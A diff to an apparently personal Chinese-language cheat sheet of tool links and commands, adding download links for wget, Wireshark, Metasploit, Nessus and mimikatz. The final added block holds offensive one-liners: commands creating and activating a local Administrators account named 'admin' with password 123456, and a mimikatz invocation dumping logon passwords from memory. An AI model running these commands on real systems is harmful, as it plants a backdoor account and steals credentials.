@@ -235,7 +235,7 @@ curl -x 10.34.3.71:808 www.baidu.com
 curl -Oku XhstormR:123456 "sftp://127.0.0.1/d/download/123.txt"
 
 Wget：
-https://eternallybored.org/misc/wget/
+https://eternallybored.org/misc/wget/current/wget64.exe
 wget -e "http_proxy=10.34.3.71:808" www.baidu.com
 
 Aria2：
@@ -414,6 +414,7 @@ https://mirrors.ustc.edu.cn/
 http://mirrors.hust.edu.cn/
 http://mirror.bit.edu.cn/web/
 http://mirrors.163.com/
+http://mirrors.sohu.com/
 http://mirrors.aliyun.com/
 http://mirrors.yun-idc.com/
 
@@ -427,6 +428,8 @@ https://docs.microsoft.com/en-us/sysinternals/downloads/
 https://bellard.org/tcc/
 
 https://frippery.org/files/busybox/busybox64.exe
+
+https://www.wireshark.org/download.html
 
 https://www.cs.princeton.edu/~bwk/btl.mirror/index.html
 
@@ -799,6 +802,12 @@ http://ww4.sinaimg.cn/large/a15b4afegy1fk3opedx7sj203k03kt99
 https://drops.tuisec.win/
 https://paper.tuisec.win/
 
+漏洞利用：Metasploit
+https://windows.metasploit.com/
+
+漏洞扫描：Nessus
+https://www.tenable.com/products/nessus/select-your-operating-system
+
 漏洞渗透：Burp Suite
 https://portswigger.net/burp/freedownload
 
@@ -810,6 +819,16 @@ https://github.com/sqlmapproject/sqlmap/archive/master.zip
 
 API 测试：Postman
 https://www.getpostman.com/apps
+
+Windows 用户提权：
+cmd /c net user admin 123456 /add
+cmd /c net localgroup Administrators admin /add
+cmd /c net user admin /active:yes
+
+Windows 密码：mimikatz
+https://github.com/gentilkiwi/mimikatz
+-----
+mimikatz.exe "log 123.log" version hostname privilege::debug sekurlsa::logonpasswords exit
 ```
 
 ```bash
